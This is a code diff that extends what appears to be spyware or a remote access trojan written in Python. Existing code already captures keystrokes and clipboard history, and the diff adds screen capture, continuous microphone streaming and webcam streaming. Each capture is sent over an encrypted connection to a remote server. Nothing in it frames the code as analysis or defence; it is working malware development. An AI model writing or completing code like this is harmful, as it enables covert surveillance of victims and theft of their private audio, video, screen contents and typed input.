@@ -10,12 +10,18 @@ import os
 import pickle
 import pyperclip
 import threading
+import pyaudio
 from pynput import keyboard
 from cryptography.fernet import Fernet
 from datetime import datetime
 from connection_module import SecureConnectionClient
 
 start_port, end_port = 50000, 50100
+
+CHUNK = 1024 
+FORMAT = pyaudio.paInt16 
+CHANNELS = 2 
+RATE = 44100
 
 SERVER_IP = '127.0.0.1'
 
@@ -94,6 +100,30 @@ def list_directory(client):
     except Exception as e:
         client.send_data_AES(f"ERROR: {str(e)}".encode("utf-8"))
 
+def merge_audio(mic_data, computer_data):
+    mic_array = np.frombuffer(mic_data, dtype=np.int16)
+    computer_array = np.frombuffer(computer_data, dtype=np.int16)
+    min_length = min(len(mic_array), len(computer_array))
+    mic_array = mic_array[:min_length]
+    computer_array = computer_array[:min_length]
+    mixed_array = mic_array + computer_array
+    mixed_array = np.clip(mixed_array, -32768, 32767)
+    return mixed_array.tobytes()
+
+def open_audio_streams(audio, device_indices):
+    streams = []
+    for device_index in device_indices:
+        stream = audio.open(
+            format=FORMAT,
+            channels=CHANNELS,
+            rate=RATE,
+            input=True,
+            input_device_index=device_index,
+            frames_per_buffer=CHUNK
+        )
+        streams.append(stream)
+    return streams
+
 def input_capture(client):
     key = load_key()
     keystroke_history = load_keystrokes(key)
@@ -114,14 +144,36 @@ def clipboard_data(client):
     clipboard_history_bytes = clipboard_history_json.encode('utf-8')
     client.send_data_AES(clipboard_history_bytes)
 
-def screenshot_capture(client):
-    pass
+def list_audio_devices(audio):
+    devices = []
+    for i in range(audio.get_device_count()):
+        device_info = audio.get_device_info_by_index(i)
+        devices.append((i, device_info['name']))
+    return devices
 
+def screenshot_capture(client):
+    screenshot = pyautogui.screenshot()
+    screenshot_np = np.array(screenshot)
+    screenshot_np = cv2.resize(screenshot_np, (1280, 720))
+    screenshot_np = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
+    img_data = screenshot_np.tobytes()
+    client.send_data_AES(img_data)
+  
 def audio_capture(client):
-    pass
+    audio = pyaudio.PyAudio()
+    mic_stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+    while True:
+        mic_data = mic_stream.read(CHUNK)
+        client.send_data_AES(mic_data)
 
 def video_capture(client):
-    pass
+    cap = cv2.VideoCapture(0)
+    while True:
+        ret, frame = cap.read()
+        if not ret:
+            break
+        data = pickle.dumps(frame)
+        client.send_data_AES(data)
 
 def screen_capture(client):
     capturing = True
